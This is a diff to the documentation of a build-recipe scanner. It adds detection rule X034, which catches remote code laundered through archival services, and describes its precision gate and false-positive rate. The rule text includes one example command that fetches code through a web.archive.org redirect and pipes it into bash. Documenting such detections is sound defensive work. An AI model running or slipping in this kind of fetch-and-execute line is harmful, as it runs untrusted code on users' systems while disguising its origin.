@@ -79,6 +79,7 @@ evasion in a recipe is ordinary content there.
 | [X031](#x031) | Build Reads Non-Code Text | HIGH |
 | [X032](#x032) | Command Name Assembled By Splicing | HIGH |
 | [X033](#x033) | File With No Provenance Executed | HIGH |
+| [X034](#x034) | Fetch Laundered Through An Archival Service | HIGH |
 <!-- /generated: page-index -->
 
 ### X001: Encoded Payload Decoded And Executed {#x001}
@@ -637,3 +638,28 @@ the source root has no provenance at all. Files inside the unpacked tree (a
 relative path after `cd`, or `$srcdir/pkg-ver/...`), declared source names,
 freshly written names, and anything a fetch client produced (H082's case)
 stay out of scope.
+
+### X034: Fetch Laundered Through An Archival Service {#x034}
+
+**HIGH** (weight 25) · category `evasion`
+
+Fires when an archival service is used as a redirector: an archive URL whose
+path embeds a *second* absolute URL, on a line that also reaches a shell or
+interpreter. `web.archive.org` and `archive.today` front a fresh origin behind
+a reputation the reader trusts, so the diff shows a familiar host while the
+build runs code from somewhere else:
+
+```bash
+bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/...' 2>/dev/null)
+```
+
+The executor gate is what keeps it precise. A recipe that pins a vanished
+upstream, `source=("https://web.archive.org/web/<id>/https://…tar.gz")`, spells
+one URL and fetches it into a file; it names no executor and stays quiet. The
+rule also stands down on a plain `curl`/`wget` fetch piped into a shell, which
+[R001](fetch-and-execution.md#r001) and R002 already own, so one operation is
+not scored twice.
+
+Measured on the locked benign corpus: 0/3,739.
+
+**Related:** [X006](#x006), [X016](#x016)
